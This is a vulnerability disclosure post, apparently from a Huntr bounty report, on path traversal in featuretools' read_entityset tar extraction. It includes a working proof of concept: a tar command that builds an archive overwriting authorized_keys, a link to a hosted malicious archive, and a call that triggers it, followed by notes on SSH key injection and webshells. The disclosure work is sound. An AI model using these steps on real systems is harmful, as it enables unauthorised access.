---
layout: post
title:  "Huntr: Arbitrary File Overwrite in read_entityset api"
date:  2024-04-07 10:31:06 +0800
categories: file-overwrite
---

## Name

> Huntr: Arbitrary File Overwrite in read_entityset api in featuretools

## Weakness

> CWE-22: Path Traversal

## Severity

> High (8.8)

## Description

The [featuretools.read_entityset](https://featuretools.alteryx.com/en/stable/generated/featuretools.read_entityset.html#featuretools.read_entityset) function does not adequately prevent malicious tar files from performing path traversal attacks. This can allow the downloading of malicious tar files that can overwrite any file. This leads directly to a high impact regarding the integrity of files. An attacker could also abuse this to impact the availability, by deleting system files, personal files, or application files. Remote code execution is also possible through various means.

The vulnerable function is exposed through the `featuretools.read_entityset` function, which can be imported easily. It's an api used to read data_description.json from directory on disk, S3 path, or URL which is tar file.

This code snippet shows how the `read_entityset` function extracts a tar file downloaded from internet without performing any security checks. 

```
def read_entityset(path, profile_name=None, **kwargs):
    """Read entityset from disk, S3 path, or URL.

    Args:
        path (str): Directory on disk, S3 path, or URL to read `data_description.json`.
        profile_name (str, bool): The AWS profile specified to write to S3. Will default to None and search for AWS credentials.
            Set to False to use an anonymous profile.
        kwargs (keywords): Additional keyword arguments to pass as keyword arguments to the underlying deserialization method.
    """
    if _is_url(path) or _is_s3(path) or _is_local_tar(str(path)):
        with tempfile.TemporaryDirectory() as tmpdir:
            local_path = path
            transport_params = None

            if _is_s3(path):
                transport_params = get_transport_params(profile_name)

            if _is_s3(path) or _is_url(path):
                local_path = os.path.join(tmpdir, "temporary_es")
                use_smartopen_es(local_path, path, transport_params) # download file from url!
            ### tar file extracted to tepdir without any security checks ###
            with tarfile.open(str(local_path)) as tar:
                tar.extractall(path=tmpdir)

            data_description = read_data_description(tmpdir)
            return description_to_entityset(data_description, **kwargs)
    else:
        data_description = read_data_description(path)
        return description_to_entityset(data_description, **kwargs)
```

The Python documentation explains us that tarfiles may have absolute filenames starting with / which could overwite files in system.

```
Warning: Never extract archives from untrusted sources without prior inspection. 
It is possible that files are created outside of path, 
e.g. members that have absolute filenames starting with "/" or filenames with two dots "..".
```

## Proof of Concept

An attacker can create a malicous tar file using following command:

```
tar --absolute-names -cvf hack.tar /home/kali/.ssh/authorized_keys
```

Then, the attacker will upload the `hack.tar` to public server. 

I have uploaded one malicous tar file for testing: [https://raw.githubusercontent.com/sunriseXu/onnx/main/validated/hack.tar](https://raw.githubusercontent.com/sunriseXu/onnx/main/validated/hack.tar)

If anyone now downloads tar using `read_entityset` api, causing automatically extracting the malicous tar file and overwrite files silently.

```
import featuretools as ft
ft.read_entityset(path="https://raw.githubusercontent.com/sunriseXu/onnx/main/validated/hack.tar")
```

```
$ cat /home/kali/.ssh/authorized_keys
ssh-rsa xxx hacker@test.com
```

Tested on Google Colab: [https://colab.research.google.com/drive/1qc7qg_VPPHKVOUT-xhSygg2M7mwDdVTt?usp=sharing](https://colab.research.google.com/drive/1qc7qg_VPPHKVOUT-xhSygg2M7mwDdVTt?usp=sharing)

![poc](https://live.staticflickr.com/65535/53637853744_26b8a5fff7_h.jpg)


## Impact

This vulnerability can have severe consequences. This section will highlight some tangible impact.

### SSH Access

On servers that have SSH enabled, an attacker may be able to inject their own public RSA key into the authorized_keys file, leading to remote code execution.

### Web Servers

On servers hosting web servers, various vulnerabilities can be exploited. On PHP or JSP server, remote code execution may be possible via uploading a webshell. On other servers an HTML file can be uploaded to achieve Cross-site Scripting (XSS)


## Reference

[https://huntr.com/bounties/5d7e5752-085c-4e93-af0d-e25f05a27b89](https://huntr.com/bounties/5d7e5752-085c-4e93-af0d-e25f05a27b89)

## Occurrences

[https://github.com/alteryx/featuretools/blob/21d0bf0915238ba6c6bc1e958b9a91b209f88de5/featuretools/entityset/deserialize.py#L170](https://github.com/alteryx/featuretools/blob/21d0bf0915238ba6c6bc1e958b9a91b209f88de5/featuretools/entityset/deserialize.py#L170)
